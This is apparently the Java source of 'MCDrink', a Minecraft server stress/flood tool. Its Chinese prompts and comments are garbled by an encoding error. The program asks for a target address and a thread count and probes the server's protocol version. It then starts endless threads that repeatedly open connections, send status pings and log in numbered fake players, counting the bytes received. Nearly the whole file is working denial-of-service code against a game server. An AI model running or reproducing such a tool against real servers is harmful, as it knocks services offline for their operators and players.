import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;

public class main {
	public static long data=0;
	public static String[] part1;
	public static int port;
	public static byte[] hand;
	public static byte[] login;
	public static byte[] ping;
	public static byte[] pack;
	public static int version=-1;
	public static long killT=0;
	public static long point=0;
	public static String text="";
	public static void main(String[] args) {
		// TODO �Զ����ɵķ������
		System.out.println("��ӭʹ��MCDrink,����:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
		System.out.println("���������mc��Э��,���ٹ���mc1.7�����ϵİ汾�ķ�����(��Ϊ1.7���°汾�ķ�����Э����ܲ�һ��),�ﵽѹ���Ŀ��");
		Scanner s=new Scanner(System.in);
		System.out.print("�����������������ַ(��127.0.0.1:25565):");
		String ip=s.nextLine();
		System.out.print("�������߳�����(��cpu��1000����Ч�����):");
		String threadNum=s.nextLine();
		main.part1=ip.split(":");
		main.port=Integer.parseInt(part1[1]);
		int num=Integer.parseInt(threadNum);
		System.out.print("����������ַ�����㼸��Ӣ�Ļ����־Ϳ��ԣ����ǲ�Ҫ̫�࣬���������ģ�:");
		text=s.nextLine();
		System.out.println("���ڴ��뻺��");
		
		
		//���ְ���������ʼ��
		ByteArrayOutputStream b ;
		DataOutputStream handshake;
		//��һ������
		try {
			b= new ByteArrayOutputStream();
			handshake = new DataOutputStream(b);
			handshake.write(0x00);
			main.writeVarInt(handshake,-1);//�汾��δ֪
			main.writeVarInt(handshake,main.part1[0].length()); //ip��ַ����
			handshake.writeBytes(main.part1[0]); //ip
			handshake.writeShort(main.port); //port
			main.writeVarInt(handshake, 1); //state (1 for handshake)
			hand=b.toByteArray();
			
			b= new ByteArrayOutputStream();
			handshake = new DataOutputStream(b);
			handshake.write(0x01);
			handshake.writeLong(Long.MAX_VALUE);
			ping=b.toByteArray();
			
			b = new ByteArrayOutputStream();
			handshake = new DataOutputStream(b);
			handshake.write(0x00);
			pack=b.toByteArray();
			
		} catch (IOException e) {
			// TODO �Զ����ɵ� catch ��
			e.printStackTrace();
		}//������
		
		System.out.println("����̽��汾..");
		boolean lock=true;
		try {
				Socket s1=new Socket(main.part1[0],main.port);
				//��׼��
				InputStream is=s1.getInputStream();
				DataInputStream di=new DataInputStream(is);
				OutputStream os=s1.getOutputStream();
				DataOutputStream dos=new DataOutputStream(os);
				
				//����
				main.writeVarInt(dos, main.hand.length); //prepend size
				dos.write(main.hand); //write handshake packet
				//��С��
				main.writeVarInt(dos, main.pack.length); //prepend size
				dos.write(main.pack); //write handshake packet
				dos.flush();
				
				main.data=main.data+main.readVarInt(di);//������С
				main.readVarInt(di);
				byte[] temp1=new byte[main.readVarInt(di)];
				di.readFully(temp1);
		
				String motdT=new String(temp1);
				JsonParser json=new JsonParser();
	            JsonElement part5 = json.parse(motdT);
	            JsonElement part6=part5.getAsJsonObject().get("version");
	            System.out.println("�������汾:"+part6.getAsJsonObject().get("name").getAsString()+",Э��汾��:"+part6.getAsJsonObject().get("protocol").getAsInt());
	            version=part6.getAsJsonObject().get("protocol").getAsInt();
				
				di.close();
				is.close();
				dos.close();
				os.close();
				s1.close();
		} catch (Exception e) {
			lock=false;
			e.printStackTrace();
			System.out.print("̽��ʧ�ܣ����ֶ�����Э��汾��:");
			version=Integer.parseInt(s.nextLine());
		}
		if(lock) {
			System.out.print("�ղ�̽�⵽���Ƿ������Э��汾�ţ�[y/n]:");
			String temp=s.nextLine();
			if((!temp.equals("y"))&&(!temp.equals("Y"))) {
				System.out.print("��������ȷ��Э��汾��:");
				version=Integer.parseInt(s.nextLine());
			}
		}
		try {
			b= new ByteArrayOutputStream();
			handshake = new DataOutputStream(b);
			handshake.write(0x00);
			main.writeVarInt(handshake,version);//�汾��δ֪
			main.writeVarInt(handshake,main.part1[0].length()); //ip��ַ����
			handshake.writeBytes(main.part1[0]); //ip
			handshake.writeShort(main.port); //port
			main.writeVarInt(handshake, 2); //state (1 for handshake)
			login=b.toByteArray();
		}catch(Exception e) {
			e.printStackTrace();
		}
		System.out.println("׼�����,���������߳�,��ʱ����ʾ\"[AnotherThread]>0byte\"��Ϣ��Ϊ����ʧ��");
		Runnable thread4 = new Thread4(); 
		Thread thread3 = new Thread(thread4);
		thread3.start();//���������߳�
		for(int i=1;i<=num;i++) {
			Runnable thread1 = new Thread1(); 
			Thread thread2 = new Thread(thread1);
			thread2.start();//���������߳�
		}
		
	}
	public static int readVarInt(DataInputStream in) throws IOException {
		int i = 0;
		int j = 0;
		while (true) {
			int k = in.readByte();
			i |= (k & 0x7F) << j++ * 7;
			if (j > 5) throw new RuntimeException("VarInt too big");
			if ((k & 0x80) != 128) break;
		}
		return i;
	}
	public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
		while (true) {
			if ((paramInt & 0xFFFFFF80) == 0) {
				out.writeByte(paramInt);
				return;
			}
			out.writeByte(paramInt & 0x7F | 0x80);
			paramInt >>>= 7;
		}
	}
}
class Thread1 implements Runnable {
	@Override
	public void run() {
			while(true) {
				try {
				Socket s=new Socket(main.part1[0],main.port);
				//��׼��
				InputStream is=s.getInputStream();
				DataInputStream di=new DataInputStream(is);
				OutputStream os=s.getOutputStream();
				DataOutputStream dos=new DataOutputStream(os);
				int temp;
				
				//����
				main.writeVarInt(dos, main.hand.length); //prepend size
				dos.write(main.hand); //write handshake packet
				//��С��
				main.writeVarInt(dos, main.pack.length); //prepend size
				dos.write(main.pack); //write handshake packet
				dos.flush();
				
				main.data=main.data+main.readVarInt(di);//������С
				main.readVarInt(di);
				byte[] temp1=new byte[main.readVarInt(di)];
				di.readFully(temp1);
				
				try {
					//ping��
					main.writeVarInt(dos, main.ping.length); //prepend size
					dos.write(main.ping); //write handshake packet
					dos.flush();
					main.data=main.data+main.readVarInt(di);
					main.readVarInt(di);
					di.readLong();
					//di.readLong();
				}catch(Exception e) {
					
				}
				
				di.close();
				is.close();
				dos.close();
				os.close();
				s.close();
				
				s=new Socket(main.part1[0],main.port);
				//��׼��
				is=s.getInputStream();
				di=new DataInputStream(is);
				os=s.getOutputStream();
				dos=new DataOutputStream(os);
				//�ڶ�������
				main.writeVarInt(dos, main.login.length); //prepend size
				dos.write(main.login); //write handshake packet
				ByteArrayOutputStream b ;
				DataOutputStream handshake;
				b= new ByteArrayOutputStream();
				handshake = new DataOutputStream(b);
				handshake.write(0x00);
				String temp5=main.text+main.point;
				main.point++;
				main.writeVarInt(handshake,temp5.length());
				handshake.writeBytes(temp5);
				byte[] username=b.toByteArray();
				main.writeVarInt(dos, username.length); //prepend size
				dos.write(username); //write handshake packet
				dos.flush();
				s.setSoTimeout(1500);
				while(true) {
					try {
					int length=main.readVarInt(di);
					main.data=main.data+length;
					byte[] lj=new byte[length];
					di.readFully(lj);
					}catch(Exception e) {break;}
				}
				//main.data=main.data+main.readVarInt(di);<--���Ӳ�Ҫ���������
				di.close();
				is.close();
				dos.close();
				os.close();
				s.close();
				} catch (Exception e) {
					// TODO �Զ����ɵ� catch ��
					//e.printStackTrace();
					main.killT++;
					//e.printStackTrace();
				}
			}
	}
}

class Thread4 implements Runnable {
	@Override
	public void run() {
		try {
			while(true) {
				Thread.sleep(3000);
				if(main.data>=1024*1024*1024) {
					double a=main.data/(1024.0*1024.0*1024.0);
					System.out.println("[AnotherThread]>"+a+"kb,"+main.killT+"thread");
					continue;
				}
				if(main.data>=1024*1024) {
					double a=main.data/(1024.0*1024.0);
					System.out.println("[AnotherThread]>"+a+"mb,"+main.killT+"thread");
					continue;
				}
				if(main.data>=1024) {
					double a=main.data/1024.0;
					System.out.println("[AnotherThread]>"+a+"kb,"+main.killT+"thread");
					continue;
				}
				if(main.data<1024) {
					System.out.println("[AnotherThread]>"+main.data+"byte,"+main.killT+"thread");
					continue;
				}
			}
		} catch (InterruptedException e) {
			// TODO �Զ����ɵ� catch ��
			e.printStackTrace();
		}
		
	}
}